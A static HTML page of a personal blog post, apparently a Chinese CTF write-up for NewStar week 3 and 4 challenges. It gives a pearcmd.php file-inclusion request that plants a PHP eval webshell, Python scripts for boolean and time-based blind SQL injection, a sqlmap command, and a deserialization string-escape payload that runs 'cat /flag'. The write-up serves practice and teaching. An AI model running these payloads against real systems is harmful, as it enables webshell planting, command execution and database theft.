@@ -1,0 +1,287 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>newstar week3 week 4 复现 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="newstar week3 week 4 复现 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Include 🍐
+参考:
+https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp?accessToken=eyJhb..." />
+    <meta name="keywords" content="反序列化字符串逃逸,文件包含之pearcmd.php,sql布尔盲注" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              newstar week3 week 4 复现
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-31
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://NaCl1.github.io/tag/1toJ_aJiH/" class="post-tag">
+                  # 反序列化字符串逃逸
+                </a>
+              
+                <a href="https://NaCl1.github.io/tag/pAuRWn8gp/" class="post-tag">
+                  # 文件包含之pearcmd.php
+                </a>
+              
+                <a href="https://NaCl1.github.io/tag/msWdg3upf/" class="post-tag">
+                  # sql布尔盲注
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="include">Include 🍐</h1>
+<p>参考:<br>
+https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNDAyNTgsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODEzOTk1OCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMjk0NzkyOX0.Vio4IE1jKcRPrrX-vwzIKZdUDJS8hrY3uBXDFNOjya0</p>
+<p>poc:</p>
+<pre><code class="language-http">GET /?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php HTTP/1.1
+Host: a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+
+</code></pre>
+<pre><code class="language-http">POST /?file=/tmp/cmd HTTP/1.1
+Host: a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+0=system(&quot;cat /flag&quot;);
+</code></pre>
+<h1 id="medium_sql">medium_sql</h1>
+<p>bool注入<br>
+exp:</p>
+<pre><code class="language-python">import requests
+import time
+flag = ''
+host = &quot;http://68a466eb-e069-43b9-8837-1324a36073f0.node4.buuoj.cn:81/&quot;
+#TMP0919'anD/**/Ascii(suBstr((seleCt/**/DatAbase()),1,1))&gt;1%23
+#sql = &quot;('c')&quot;
+#sql = &quot;(database())&quot;
+#sql = &quot;(selEct(gRoup_concAt(tAble_nAMe))fRom(infOrmAtion_scHeMa.taBles)wHeRe(tAbLe_schEMa=database()))&quot;
+#sql = &quot;(selEct(gRoup_concAt(ColuMn_nAMe))fRom(infOrmAtion_scHeMa.COLuMns)wHeRe(tAbLe_NAme='here_is_flag'))&quot;
+sql = &quot;(seLeCt(gRoup_concat(flag))fRom(ctf.here_is_flag))&quot;
+for i in range(1,1000):
+    min = 32
+    max = 128
+    mid = (min + max)//2
+    while(min &lt; max):
+        payload = host + &quot;?id=TMP0919'anD/**/(Ascii(suBstr(&quot;+ sql +&quot;,{},1))&gt;{})--+&quot;.format(i,mid)
+        res = requests.get(url=payload)
+        time.sleep(0.05)
+        if 'not exists' in res.text:
+            max = mid
+        else:
+            min = mid + 1
+        mid = (min + max)//2
+    if mid &lt;= 32 or mid &gt;= 127:
+        break
+    flag = flag+chr(mid)
+    print(flag)
+
+</code></pre>
+<p>得到flag: flag{81f5bcaa-3a67-47a5-9dfd-30e7943c818d}</p>
+<p>贴一下尝试使用sqlmap来解这题:</p>
+<pre><code>sqlmap -u 'http://1c69bd84-56b0-45d6-a27f-f9023db1fc6e.node4.buuoj.cn:81/?id=TMP0919' -D 'ctf' -T 'here_is_flag' -C 'flag'  --dump --delay 0.05 --technique=B
+</code></pre>
+<h1 id="week4-midsql">week4 midsql</h1>
+<p>时间注入</p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://945d5f79-e276-4699-abaf-f770b3af1531.node4.buuoj.cn:81/'
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/database()),{},1))&gt;{},sleep(2),1);'
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),{},1))&gt;{},sleep(1),1);'
+# id,name,price   
+sql = '?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{},1))&gt;{},sleep(1),1);'
+#items
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),{},1))&gt;{},sleep(1),1);'
+
+flag = ''
+for i in range(1000):
+    min = 32
+    max = 128
+    mid = (min + max) // 2
+    while(min &lt; max):
+        payload = url + sql.format(i, mid)
+        time1 = time.time()
+        res = requests.get(url=payload)
+        if time.time() - time1 &gt; 1:
+            min = mid + 1
+        else:
+            max = mid
+        mid = (min + max) // 2
+        if mid &lt;=32 or mid &gt;= 127:
+            break
+    flag = flag + chr(mid)
+    print(flag)
+
+</code></pre>
+<h1 id="week4-逃">week4 逃</h1>
+<p>反序列化字符串逃逸<br>
+https://blog.csdn.net/qq_53856457/article/details/124764427<br>
+payload:</p>
+<pre><code>http://bcf15483-330f-4b66-aeaa-5f36c6e55f8a.node4.buuoj.cn:81/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#include">Include 🍐</a></li>
+<li><a href="#medium_sql">medium_sql</a></li>
+<li><a href="#week4-midsql">week4 midsql</a></li>
+<li><a href="#week4-%E9%80%83">week4 逃</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/ssti-lou-dong/">
+              <h3 class="post-title">
+                ssti漏洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
